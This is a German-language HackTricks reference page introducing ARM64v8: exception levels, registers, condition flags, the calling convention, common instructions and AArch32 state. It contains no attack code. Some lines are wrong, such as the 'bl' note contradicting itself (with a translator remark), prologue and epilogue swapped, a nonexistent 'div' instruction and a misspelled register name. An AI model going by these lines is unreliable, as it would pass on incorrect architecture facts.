# Einführung in ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Exception Levels - EL (ARM64v8)**

In der ARMv8-Architektur definieren Ausführungslevel, bekannt als Exception Levels (ELs), das Privilegniveau und die Fähigkeiten der Ausführungsumgebung. Es gibt vier Exception Levels, von EL0 bis EL3, die jeweils unterschiedliche Zwecke erfüllen:

1. **EL0 - User Mode**:
- Dies ist das am wenigsten privilegierte Level und wird zum Ausführen gewöhnlicher Anwendungsprogramme verwendet.
- Anwendungen, die in EL0 laufen, sind voneinander und vom Systemsoftware isoliert, was Sicherheit und Stabilität erhöht.
2. **EL1 - Operating System Kernel Mode**:
- Die meisten Betriebssystemkerne laufen auf diesem Level.
- EL1 hat mehr Privilegien als EL0 und kann auf Systemressourcen zugreifen, jedoch mit einigen Beschränkungen, um die Systemintegrität zu gewährleisten.
3. **EL2 - Hypervisor Mode**:
- Dieses Level wird für Virtualisierung verwendet. Ein Hypervisor, der in EL2 läuft, kann mehrere Betriebssysteme (jeweils in ihrem eigenen EL1) auf derselben physischen Hardware verwalten.
- EL2 bietet Funktionen zur Isolation und Steuerung der virtualisierten Umgebungen.
4. **EL3 - Secure Monitor Mode**:
- Dies ist das privilegierteste Level und wird häufig für Secure Boot und Trusted Execution Environments verwendet.
- EL3 kann Zugriffe zwischen sicheren und nicht-sicheren Zuständen verwalten und kontrollieren (z. B. secure boot, trusted OS usw.).

Die Verwendung dieser Level ermöglicht eine strukturierte und sichere Verwaltung verschiedener Aspekte des Systems, von Benutzeranwendungen bis zur höchst privilegierten Systemsoftware. Der ARMv8-Ansatz zu Privileglevels hilft dabei, verschiedene Systemkomponenten effektiv zu isolieren und so die Sicherheit und Robustheit des Systems zu verbessern.

## **Registers (ARM64v8)**

ARM64 hat **31 allgemeine Register**, bezeichnet `x0` bis `x30`. Jedes kann einen **64-Bit** (8-Byte) Wert speichern. Für Operationen, die nur 32-Bit-Werte benötigen, können dieselben Register im 32-Bit-Modus über die Namen `w0` bis `w30` angesprochen werden.

1. **`x0`** bis **`x7`** - Diese werden typischerweise als temporäre Register und zum Übergeben von Parametern an Subroutinen verwendet.
- **`x0`** trägt auch die Rückgabedaten einer Funktion.
2. **`x8`** - Im Linux-Kernel wird `x8` als Systemcall-Nummer für die `svc`-Instruktion verwendet. **In macOS ist jedoch `x16` die verwendete!**
3. **`x9`** bis **`x15`** - Weitere temporäre Register, oft für lokale Variablen verwendet.
4. **`x16`** und **`x17`** - **Intra-procedural Call Registers**. Temporäre Register für unmittelbare Werte. Sie werden auch für indirekte Funktionsaufrufe und PLT-Stubs verwendet.
- **`x16`** wird in **macOS** als **Systemcall-Nummer** für die **`svc`**-Instruktion verwendet.
5. **`x18`** - **Platform register**. Es kann als allgemeines Register verwendet werden, aber auf manchen Plattformen ist dieses Register für plattformspezifische Zwecke reserviert: Pointer auf den aktuellen Thread-Umgebungsblock in Windows oder um auf die momentan **ausführende task structure im linux kernel** zu zeigen.
6. **`x19`** bis **`x28`** - Dies sind vom Callee zu sichernde Register. Eine Funktion muss die Werte dieser Register für ihren Caller erhalten, daher werden sie auf dem Stack gespeichert und vor der Rückkehr zum Caller wiederhergestellt.
7. **`x29`** - **Frame pointer**, um den Stackframe nachzuverfolgen. Wenn ein neuer Stackframe erstellt wird, weil eine Funktion aufgerufen wird, wird das **`x29`**-Register **im Stack gespeichert** und die **neue** Frame-Pointer-Adresse (die **`sp`**-Adresse) wird in diesem Register **gespeichert**.
- Dieses Register kann auch als **allgemeines Register** verwendet werden, obwohl es normalerweise als Referenz für **lokale Variablen** dient.
8. **`x30`** oder **`lr`** - **Link register**. Es hält die **Rücksprungadresse**, wenn eine `BL` (Branch with Link) oder `BLR` (Branch with Link to Register) Instruktion ausgeführt wird, indem der aktuelle **`pc`**-Wert in dieses Register gespeichert wird.
- Es kann auch wie jedes andere Register verwendet werden.
- Wenn die aktuelle Funktion eine neue Funktion aufruft und dadurch `lr` überschrieben wird, wird `lr` zu Beginn auf dem Stack gespeichert; dies ist das Epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Speichere `fp` und `lr`, generiere Platz und setze neuen `fp`) und am Ende wiederhergestellt; dies ist der Prolog (`ldp x29, x30, [sp], #48; ret` -> Wiederherstellen von `fp` und `lr` und Rückkehr).
9. **`sp`** - **Stack pointer**, verwendet, um die Spitze des Stacks zu verfolgen.
- Der **`sp`**-Wert sollte immer mindestens eine **Quadword-Ausrichtung** haben, sonst kann eine Alignment-Exception auftreten.
10. **`pc`** - **Program counter**, der auf die nächste Instruktion zeigt. Dieses Register kann nur durch das Erzeugen von Exceptions, Exception-Returns und Branches aktualisiert werden. Die einzigen gewöhnlichen Instruktionen, die dieses Register lesen können, sind Branch-with-Link-Instruktionen (BL, BLR), um die **`pc`**-Adresse in **`lr`** (Link Register) zu speichern.
11. **`xzr`** - **Zero register**. Auch als **`wzr`** in seiner **32**-Bit-Form bezeichnet. Kann verwendet werden, um leicht den Nullwert zu erhalten (häufige Operation) oder um Vergleiche mit **`subs`** durchzuführen wie **`subs XZR, Xn, #10`**, wobei das Ergebnis nirgendwo gespeichert wird (in **`xzr`**).

Die **`Wn`** Register sind die **32bit** Version der **`Xn`** Register.

> [!TIP]
> Die Register von `X0` - `X18` sind volatil, das bedeutet, dass ihre Werte durch Funktionsaufrufe und Interrupts geändert werden können. Die Register von `X19` - `X28` sind hingegen nicht-volatile, was bedeutet, dass ihre Werte über Funktionsaufrufe hinweg erhalten bleiben müssen ("callee saved").

### SIMD and Floating-Point Registers

Außerdem gibt es weitere **32 Register mit 128bit Länge**, die in optimierten Single Instruction Multiple Data (SIMD)-Operationen und für Gleitkommaberechnungen verwendet werden können. Diese werden als Vn-Register bezeichnet, obwohl sie auch in **64**-Bit-, **32**-Bit-, **16**-Bit- und **8**-Bit-Form betrieben werden können und dann **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** und **`Bn`** genannt werden.

### System Registers

**Es gibt Hunderte von Systemregistern**, auch Special-Purpose Registers (SPRs) genannt, die zur **Überwachung** und **Steuerung** des Verhaltens von **Prozessoren** verwendet werden.\
Sie können nur mit den speziellen Instruktionen **`mrs`** und **`msr`** gelesen oder gesetzt werden.

Die Spezialregister **`TPIDR_EL0`** und **`TPIDDR_EL0`** tauchen häufig beim Reverse Engineering auf. Der Suffix `EL0` gibt die **minimal notwendige Exception** an, aus der das Register zugänglich ist (in diesem Fall ist EL0 das reguläre Exception- (Privileg-)Level, in dem normale Programme laufen).\
Sie werden oft verwendet, um die **Basisadresse des thread-local storage** Speicherbereichs zu speichern. Üblicherweise ist das erste les- und schreibbar für Programme, die in EL0 laufen, während das zweite von EL0 gelesen und von EL1 geschrieben werden kann (z. B. Kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** enthält mehrere Prozesskomponenten, die in das für das Betriebssystem sichtbare **`SPSR_ELx`** Spezialregister serialisiert sind, wobei X das **Berechtigungslevel der ausgelösten** Exception ist (das ermöglicht die Wiederherstellung des Prozesszustands, wenn die Exception beendet ist).\
Dies sind die zugänglichen Felder:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die Bedingungsflags **`N`**, **`Z`**, **`C`** und **`V``**:
- **`N`** bedeutet, dass die Operation ein negatives Ergebnis lieferte.
- **`Z`** bedeutet, dass die Operation Null lieferte.
- **`C`** bedeutet, dass ein Übertrag (carry) aufgetreten ist.
- **`V`** bedeutet, dass die Operation einen vorzeichenbehafteten Überlauf lieferte:
  - Die Summe zweier positiver Zahlen ergibt ein negatives Ergebnis.
  - Die Summe zweier negativer Zahlen ergibt ein positives Ergebnis.
  - Bei Subtraktionen, wenn eine große negative Zahl von einer kleineren positiven Zahl subtrahiert wird (oder umgekehrt) und das Ergebnis nicht innerhalb des darstellbaren Bereichs der gegebenen Bitgröße liegt.
- Offensichtlich weiß der Prozessor nicht, ob die Operation vorzeichenbehaftet ist oder nicht, daher prüft er C und V in den Operationen und zeigt an, ob ein Carry aufgetreten ist, unabhängig davon, ob es vorzeichenbehaftet oder vorzeichenlos war.

> [!WARNING]
> Nicht alle Instruktionen aktualisieren diese Flags. Einige wie **`CMP`** oder **`TST`** tun es, und andere, die ein `s`-Suffix haben wie **`ADDS`**, tun es ebenfalls.

- Das aktuelle **Registerbreiten-Flag (`nRW`)**: Wenn das Flag den Wert 0 hat, läuft das Programm beim Fortsetzen im AArch64-Ausführungszustand.
- Das aktuelle **Exception Level** (**`EL`**): Ein reguläres Programm, das in EL0 läuft, hat den Wert 0.
- Das **Single-Stepping**-Flag (**`SS`**): Wird von Debuggern verwendet, um Single-Steps auszuführen, indem das SS-Flag in **`SPSR_ELx`** durch eine Exception auf 1 gesetzt wird. Das Programm führt dann einen Schritt aus und löst eine Single-Step-Exception aus.
- Das Flag für den **illegalen Exception-Zustand** (**`IL`**): Es wird verwendet, um zu markieren, wenn Software mit Privilegien einen ungültigen Exception-Level-Transfer durchführt; dieses Flag wird auf 1 gesetzt und der Prozessor löst eine illegal state exception aus.
- Die **`DAIF`**-Flags: Diese Flags erlauben einem privilegierten Programm, bestimmte externe Exceptions selektiv zu maskieren.
- Wenn **`A`** = 1 bedeutet das, dass **asynchrone Aborts** ausgelöst werden. Das **`I`** konfiguriert die Reaktion auf externe Hardware **Interrupt Requests** (IRQs). Und das **F** bezieht sich auf **Fast Interrupt Requests** (FIRs).
- Die Flags zur Auswahl des Stack-Pointers (**`SPS`**): Privilegierte Programme, die in EL1 und höher laufen, können zwischen der Verwendung ihres eigenen Stack-Pointers und dem User-Mode-Stack-Pointer wechseln (z. B. zwischen `SP_EL1` und `EL0`). Dieses Umschalten erfolgt durch Schreiben in das spezielle Register **`SPSel`**. Dies kann nicht von EL0 aus durchgeführt werden.

## **Calling Convention (ARM64v8)**

Die ARM64-Calling-Convention legt fest, dass die **ersten acht Parameter** einer Funktion in den Registern **`x0` bis `x7`** übergeben werden. **Zusätzliche** Parameter werden auf dem **Stack** übergeben. Der **Rückgabewert** wird in Register **`x0`** zurückgegeben, oder in **`x1`**, wenn er **128 Bit** lang ist. Die Register **`x19`** bis **`x30`** und **`sp`** müssen über Funktionsaufrufe hinweg **erhalten** bleiben.

Beim Lesen einer Funktion in Assembly sollte man auf das **Function Prologue und Epilogue** achten. Das **Prologue** beinhaltet in der Regel das **Sichern des Frame-Pointers (`x29`)**, das **Aufsetzen** eines **neuen Frame-Pointers** und das **Allokieren von Stack-Speicher**. Das **Epilogue** beinhaltet normalerweise das **Wiederherstellen des gespeicherten Frame-Pointers** und das **Zurückkehren** aus der Funktion.

### Calling Convention in Swift

Swift hat seine eigene **calling convention**, die unter [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) zu finden ist.

## **Common Instructions (ARM64v8)**

ARM64-Instruktionen haben im Allgemeinen das **Format `opcode dst, src1, src2`**, wobei **`opcode`** die auszuführende **Operation** ist (wie `add`, `sub`, `mov` usw.), **`dst`** das **Zielregister** ist, in das das Ergebnis geschrieben wird, und **`src1`** und **`src2`** die **Quellregister** sind. Immediate-Werte können ebenfalls anstelle von Quellregistern verwendet werden.

- **`mov`**: **Move** einen Wert von einem **Register** in ein anderes.
- Beispiel: `mov x0, x1` — Dies verschiebt den Wert von `x1` nach `x0`.
- **`ldr`**: **Load** einen Wert aus dem **Speicher** in ein **Register**.
- Beispiel: `ldr x0, [x1]` — Dies lädt einen Wert aus der Speicheradresse, auf die `x1` zeigt, in `x0`.
- **Offset mode**: Ein Offset, das den Ursprungspointer beeinflusst, wird angegeben, zum Beispiel:
- `ldr x2, [x1, #8]`, dies lädt in x2 den Wert von x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, dies lädt in x2 ein Objekt aus dem Array x0, von der Position x1 (Index) * 4
- **Pre-indexed mode**: Dies wendet Berechnungen auf den Ursprung an, gibt das Ergebnis zurück und speichert auch den neuen Ursprung.
- `ldr x2, [x1, #8]!`, dies lädt `x1 + 8` in `x2` und speichert in x1 das Ergebnis von `x1 + 8`
- `str lr, [sp, #-4]!`, Speichert das Link-Register in sp und aktualisiert das Register sp
- **Post-index mode**: Dies ist wie das vorherige, aber die Speicheradresse wird zuerst zugegriffen und dann wird das Offset berechnet und gespeichert.
- `ldr x0, [x1], #8`, lade `x1` in `x0` und aktualisiere x1 mit `x1 + 8`
- **PC-relative addressing**: In diesem Fall wird die zu ladende Adresse relativ zum PC-Register berechnet
- `ldr x1, =_start`, Dies lädt die Adresse, an der das Symbol `_start` beginnt, in x1 relativ zum aktuellen PC.
- **`str`**: **Store** einen Wert aus einem **Register** in den **Speicher**.
- Beispiel: `str x0, [x1]` — Dies speichert den Wert in `x0` an der Speicheradresse, auf die `x1` zeigt.
- **`ldp`**: **Load Pair of Registers**. Diese Instruktion **lädt zwei Register** aus **aufeinandergestimmten Speicheradressen**. Die Speicheradresse wird typischerweise durch Hinzufügen eines Offsets zu einem anderen Register gebildet.
- Beispiel: `ldp x0, x1, [x2]` — Dies lädt `x0` und `x1` aus den Speicheradressen bei `x2` bzw. `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Diese Instruktion **schreibt zwei Register** in **aufeinanderfolgende Speicheradressen**. Die Speicheradresse wird typischerweise durch Hinzufügen eines Offsets zu einem anderen Register gebildet.
- Beispiel: `stp x0, x1, [sp]` — Dies speichert `x0` und `x1` an den Speicherstellen `sp` bzw. `sp + 8`.
- `stp x0, x1, [sp, #16]!` — Dies speichert `x0` und `x1` an `sp+16` und `sp+24` und aktualisiert `sp` auf `sp+16`.
- **`add`**: **Addiert** die Werte zweier Register und speichert das Ergebnis in einem Register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Ziel
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (Register oder Immediate)
- \[shift #N | RRX] -> Führe eine Verschiebung aus oder rufe RRX auf
- Beispiel: `add x0, x1, x2` — Dies addiert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- `add x5, x5, #1, lsl #12` — Dies entspricht 4096 (eine 1 um 12 Stellen verschoben) -> 1 0000 0000 0000 0000
- **`adds`**: Führt ein `add` aus und aktualisiert die Flags.
- **`sub`**: **Subtrahiert** die Werte zweier Register und speichert das Ergebnis in einem Register.
- Siehe **`add`** **Syntax**.
- Beispiel: `sub x0, x1, x2` — Dies subtrahiert den Wert in `x2` von `x1` und speichert das Ergebnis in `x0`.
- **`subs`**: Wie `sub`, aber aktualisiert die Flags.
- **`mul`**: **Multipliziert** die Werte von **zwei Registern** und speichert das Ergebnis in einem Register.
- Beispiel: `mul x0, x1, x2` — Dies multipliziert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- **`div`**: **Teilt** den Wert eines Registers durch ein anderes und speichert das Ergebnis in einem Register.
- Beispiel: `div x0, x1, x2` — Dies teilt den Wert in `x1` durch `x2` und speichert das Ergebnis in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Fügt am Ende Nullen hinzu und verschiebt die anderen Bits nach vorne (multipliziert mit 2^n).
- **Logical shift right**: Fügt am Anfang Nullen hinzu und verschiebt die anderen Bits nach hinten (teilt bei vorzeichenlosen Zahlen durch 2^n).
- **Arithmetic shift right**: Wie **`lsr`**, aber statt Nullen hinzuzufügen, werden, wenn das höchstwertige Bit 1 ist, Einsen hinzugefügt (Teilen durch 2^n bei vorzeichenbehafteten Zahlen).
- **Rotate right**: Wie **`lsr`**, aber was rechts entfernt wird, wird links wieder angefügt.
- **Rotate Right with Extend**: Wie **`ror`**, jedoch mit dem Carry-Flag als "höchstwertiges Bit". Das Carry-Flag wird in Bit 31 verschoben und das entfernte Bit ins Carry-Flag.
- **`bfm`**: **Bit Field Move**, diese Operationen **kopieren Bits `0...n`** aus einem Wert und platzieren sie in Positionen **`m..m+n`**. **`#s`** gibt die **linke (höhere) Bitposition** an und **`#r`** die **Rotate-Right-Menge**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopiert ein Bitfeld aus einem Register und fügt es in ein anderes Register ein.
- **`BFI X1, X2, #3, #4`**: Fügt 4 Bits von X2 ab Bit 3 in X1 ein.
- **`BFXIL X1, X2, #3, #4`**: Extrahiert ab Bit 3 von X2 vier Bits und kopiert sie nach X1.
- **`SBFIZ X1, X2, #3, #4`**: Sign-extendet 4 Bits von X2 und fügt sie in X1 beginnend an Bitposition 3 ein, wobei die rechten Bits auf 0 gesetzt werden.
- **`SBFX X1, X2, #3, #4`**: Extrahiert 4 Bits ab Bit 3 von X2, sign-extendet sie und legt das Ergebnis in X1 ab.
- **`UBFIZ X1, X2, #3, #4`**: Zero-extendet 4 Bits von X2 und fügt sie in X1 beginnend an Bitposition 3 ein, wobei die rechten Bits auf 0 gesetzt werden.
- **`UBFX X1, X2, #3, #4`**: Extrahiert 4 Bits ab Bit 3 von X2 und legt das zero-extendete Ergebnis in X1 ab.
- **Sign Extend To X:** Erweitert das Vorzeichen (oder fügt bei der unsigned-Version Nullen hinzu) eines Werts, um Operationen damit durchführen zu können:
- **`SXTB X1, W2`**: Erweitert das Vorzeichen eines Bytes **von W2 nach X1** (`W2` ist die untere Hälfte von `X2`) um die 64 Bit zu füllen.
- **`SXTH X1, W2`**: Erweitert das Vorzeichen einer 16-Bit-Zahl **von W2 nach X1** um die 64 Bit zu füllen.
- **`SXTW X1, W2`**: Erweitert das Vorzeichen eines 32-Bit-Werts **von W2 nach X1** um die 64 Bit zu füllen.
- **`UXTB X1, W2`**: Fügt Nullen (unsigned) zu einem Byte **von W2 nach X1** hinzu, um die 64 Bit zu füllen.
- **`extr`**: Extrahiert Bits aus einem angegebenen **Paar von konkatenierenden Registern**.
- Beispiel: `EXTR W3, W2, W1, #3` Dies wird **W1+W2** konkatenieren und **von Bit 3 von W2 bis Bit 3 von W1** extrahieren und in W3 speichern.
- **`cmp`**: **Vergleicht** zwei Register und setzt die Condition-Flags. Es ist ein **Alias von `subs`**, wobei das Zielregister auf das Zero-Register gesetzt wird. Nützlich, um zu prüfen, ob `m == n`.
- Es unterstützt dieselbe Syntax wie `subs`.
- Beispiel: `cmp x0, x1` — Dies vergleicht die Werte in `x0` und `x1` und setzt entsprechend die Condition-Flags.
- **`cmn`**: **Compare negative** Operand. In diesem Fall ist es ein **Alias von `adds`** und unterstützt dieselbe Syntax. Nützlich, um zu prüfen, ob `m == -n`.
- **`ccmp`**: Bedingter Vergleich; er wird nur ausgeführt, wenn ein vorheriger Vergleich wahr war, und setzt speziell die nzcv-Bits.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> wenn x1 != x2 und x3 < x4, springe zu func
- Das liegt daran, dass **`ccmp`** nur ausgeführt wird, wenn der vorherige `cmp` ein `NE` war; wenn nicht, werden die Bits `nzcv` auf 0 gesetzt (was die `blt`-Bedingung nicht erfüllt).
- Dies kann auch als `ccmn` verwendet werden (gleiches aber invertiert, wie `cmp` vs `cmn`).
- **`tst`**: Prüft, ob irgendeines der Vergleichsbits 1 ist (es funktioniert wie ein ANDS ohne das Ergebnis irgendwo zu speichern). Nützlich, um ein Register mit einem Wert zu prüfen und zu sehen, ob eines der durch den Wert angegebenen Bits gesetzt ist.
- Beispiel: `tst X1, #7` Prüft, ob eines der letzten 3 Bits von X1 1 ist.
- **`teq`**: XOR-Operation, Ergebnis wird verworfen.
- **`b`**: Unbedingter Branch.
- Beispiel: `b myFunction`
- Beachte, dass dies nicht das Link-Register mit der Rücksprungadresse füllt (nicht geeignet für Subroutinenaufrufe, die zurückkehren müssen).
- **`bl`**: **Branch** with link, wird zum **Aufruf** einer **Subroutine** verwendet. Speichert die Rücksprungadresse in **`x30`**.
- Beispiel: `bl myFunction` — Ruft die Funktion `myFunction` auf und speichert die Rücksprungadresse in `x30`.
- Hinweis: Dies füllt nicht das Link-Register mit der Rücksprungadresse (nicht geeignet für Subroutinenaufrufe, die zurückkehren müssen). [Anmerkung: dieser Satz war im Original doppelt vorhanden; belassen]
- **`blr`**: **Branch** with Link to Register, verwendet, um eine Subroutine aufzurufen, deren Ziel in einem Register steht. Speichert die Rücksprungadresse in `x30`.
- Beispiel: `blr x1` — Ruft die Funktion auf, deren Adresse in `x1` enthalten ist, und speichert die Rücksprungadresse in `x30`.
- **`ret`**: **Return** aus einer Subroutine, typischerweise unter Verwendung der Adresse in **`x30`**.
- Beispiel: `ret` — Dies kehrt aus der aktuellen Subroutine unter Verwendung der Rücksprungadresse in `x30` zurück.
- **`b.<cond>`**: Bedingte Branches.
- **`b.eq`**: **Branch if equal**, basierend auf dem vorherigen `cmp`.
- Beispiel: `b.eq label` — Wenn die vorherige `cmp`-Instruktion gleiche Werte fand, springt dies zu `label`.
- **`b.ne`**: **Branch if Not Equal**. Diese Instruktion prüft die Condition-Flags (gesetzt durch eine vorherige Vergleichs-Instruktion), und wenn die verglichenen Werte nicht gleich waren, verzweigt sie zu einem Label oder einer Adresse.
- Beispiel: Nach einer `cmp x0, x1` Instruktion, `b.ne label` — Wenn die Werte in `x0` und `x1` nicht gleich sind, springt dies zu `label`.
- **`cbz`**: **Compare and Branch on Zero**. Diese Instruktion vergleicht ein Register mit Null, und wenn es gleich ist, verzweigt sie.
- Beispiel: `cbz x0, label` — Wenn der Wert in `x0` Null ist, springt dies zu `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Diese Instruktion vergleicht ein Register mit Null, und wenn es nicht Null ist, verzweigt sie.
- Beispiel: `cbnz x0, label` — Wenn der Wert in `x0` nicht Null ist, springt dies zu `label`.
- **`tbnz`**: Test bit and branch on nonzero.
- Beispiel: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero.
- Beispiel: `tbz x0, #8, label`
- **Conditional select operations**: Diese Operationen ändern ihr Verhalten abhängig von den Condition-Bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Wenn wahr, X0 = X1, sonst X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, sonst Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Wenn wahr, Xd = Xn + 1, sonst Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, sonst Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Wenn wahr, Xd = NOT(Xn), sonst Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, sonst Xd = - Xm
- `cneg Xd, Xn, cond` -> Wenn wahr, Xd = - Xn, sonst Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Wenn wahr, Xd = 1, sonst Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Wenn wahr, Xd = \<all 1>, sonst Xd = 0
- **`adrp`**: Berechnet die **Page-Adresse eines Symbols** und speichert sie in einem Register.
- Beispiel: `adrp x0, symbol` — Dies berechnet die Page-Adresse von `symbol` und speichert sie in `x0`.
- **`ldrsw`**: **Lädt** einen signierten **32-Bit**-Wert aus dem Speicher und **sign-extendet ihn auf 64 Bit**.
- Beispiel: `ldrsw x0, [x1]` — Dies lädt einen signierten 32-Bit-Wert aus der Speicheradresse, auf die `x1` zeigt, sign-extendet ihn auf 64 Bit und speichert ihn in `x0`.
- **`stur`**: **Speichert** einen Registerwert an einer Speicheradresse, wobei ein Offset von einem anderen Register verwendet wird.
- Beispiel: `stur x0, [x1, #4]` — Dies speichert den Wert in `x0` in die Speicheradresse, die 4 Bytes größer ist als die Adresse in `x1`.
- **`svc`**: Führt einen **System Call** aus. Es steht für "Supervisor Call". Wenn der Prozessor diese Instruktion ausführt, **wechselt er vom User Mode in den Kernel Mode** und springt zu einer bestimmten Stelle im Speicher, an der der Kernel-Code zur Behandlung von System Calls liegt.

- Beispiel:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Setze den neuen Frame-Zeiger**: `mov x29, sp` (richtet den neuen Frame-Zeiger für die aktuelle Funktion ein)
3. **Platz auf dem Stack für lokale Variablen reservieren** (falls erforderlich): `sub sp, sp, <size>` (wobei `<size>` die benötigte Anzahl an Bytes ist)

### **Funktions-Epilog**

1. **Lokale Variablen freigeben (falls welche reserviert wurden)**: `add sp, sp, <size>`
2. **Link-Register und Frame-Zeiger wiederherstellen**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Rückgabe**: `ret` (gibt die Kontrolle an den Aufrufer unter Verwendung der Adresse im Link-Register zurück)

## AARCH32 Ausführungszustand

Armv8-A unterstützt die Ausführung von 32-Bit-Programmen. **AArch32** kann in einem von **zwei Befehlssätzen** laufen: **`A32`** und **`T32`** und kann mittels **`interworking`** zwischen ihnen wechseln.\  
**Privilegierte** 64-Bit-Programme können die **Ausführung von 32-Bit**-Programmen veranlassen, indem sie einen Exception-Level-Transfer auf das weniger privilegierte 32-Bit durchführen.\
Beachte, dass der Übergang von 64-Bit zu 32-Bit mit einem niedrigeren Exception-Level erfolgt (zum Beispiel ein 64-Bit-Programm in EL1, das ein Programm in EL0 auslöst). Dies geschieht, indem Bit 4 des speziellen Registers **`SPSR_ELx`** auf 1 gesetzt wird, wenn der `AArch32`-Prozessthread zur Ausführung bereit ist, und der Rest von **`SPSR_ELx`** das CPSR des `AArch32`-Programms speichert. Anschließend ruft der privilegierte Prozess die **`ERET`**-Anweisung auf, sodass der Prozessor zu **`AArch32`** wechselt und in A32 oder T32 eintritt, abhängig vom CPSR.

Das **`interworking`** erfolgt über die J- und T-Bits des CPSR. `J=0` und `T=0` bedeutet **`A32`** und `J=0` und `T=1` bedeutet **T32**. Das bedeutet im Grunde, dass das **niedrigste Bit auf 1** gesetzt wird, um anzuzeigen, dass das Instruction Set T32 ist.\
Dies wird während der **interworking branch instructions** gesetzt, kann aber auch direkt mit anderen Instruktionen gesetzt werden, wenn das PC als Zielregister gesetzt wird. Beispiel:

Ein weiteres Beispiel:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Register

There are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any operation**, however some of them are usually reserved:

- **`r15`**: Program counter (always). Contains the address of the next instruction. In A32 current + 8, in T32, current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Beachte, dass der Stack immer 16-Byte-ausgerichtet ist)
- **`r14`**: Link Register

Moreover, registers are backed up in **`banked registries`**. Das sind Speicherstellen, die die Registerwerte sichern und so ein **schnelles Context-Switching** bei der Ausnahmebehandlung und privilegierten Operationen ermöglichen, um das manuelle Speichern und Wiederherstellen der Register zu vermeiden.\
Dies geschieht, indem der Prozessorzustand vom `CPSR` in das `SPSR` des Prozessormodus gespeichert wird, in den die Exception übergeht. Beim Zurückkehren aus der Exception wird das **`CPSR`** aus dem **`SPSR`** wiederhergestellt.

### CPSR - Current Program Status Register

In AArch32 funktioniert das CPSR ähnlich wie **`PSTATE`** in AArch64 und wird ebenfalls in **`SPSR_ELx`** gespeichert, wenn eine Exception ausgelöst wird, um die Ausführung später wiederherzustellen:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die Felder sind in mehrere Gruppen unterteilt:

- Application Program Status Register (APSR): Arithmetische Flags und von EL0 zugänglich
- Execution State Registers: Prozessverhalten (vom OS verwaltet).

#### Application Program Status Register (APSR)

- Die **`N`**, **`Z`**, **`C`**, **`V`** Flags (wie in AArch64)
- Das **`Q`**-Flag: Es wird auf 1 gesetzt, wann immer während der Ausführung einer spezialisierten saturierenden arithmetischen Instruktion eine **Integer-Sättigung** auftritt. Sobald es auf **`1`** gesetzt ist, behält es diesen Wert, bis es manuell auf 0 gesetzt wird. Darüber hinaus gibt es keine Instruktion, die seinen Wert implizit prüft; die Prüfung muss manuell durch Auslesen erfolgen.
- **`GE`** (Greater than or equal) Flags: Wird in SIMD-Operationen (Single Instruction, Multiple Data) verwendet, wie etwa "parallel add" und "parallel subtract". Diese Operationen erlauben die Verarbeitung mehrerer Datenpunkte in einer einzigen Instruktion.

Zum Beispiel addiert die **`UADD8`**-Instruktion **vier Byte-Paare** (aus zwei 32-Bit-Operanden) parallel und speichert die Ergebnisse in einem 32-Bit-Register. Sie setzt anschließend die **`GE`-Flags im `APSR`** basierend auf diesen Ergebnissen. Jedes GE-Flag entspricht einer der Byte-Additionen und zeigt an, ob die Addition für dieses Byte-Paar **übergelaufen** ist.

Die **`SEL`**-Instruktion verwendet diese GE-Flags, um bedingte Aktionen auszuführen.

#### Execution State Registers

- Die **`J`**- und **`T`**-Bits: **`J`** sollte 0 sein; wenn **`T`** 0 ist, wird das Instruktionsset A32 verwendet, und wenn es 1 ist, wird T32 verwendet.
- **IT Block State Register** (`ITSTATE`): Dies sind die Bits 10-15 und 25-26. Sie speichern Bedingungen für Instruktionen innerhalb einer mit **`IT`** vorangestellten Gruppe.
- **`E`**-Bit: Gibt die **Endianness** an.
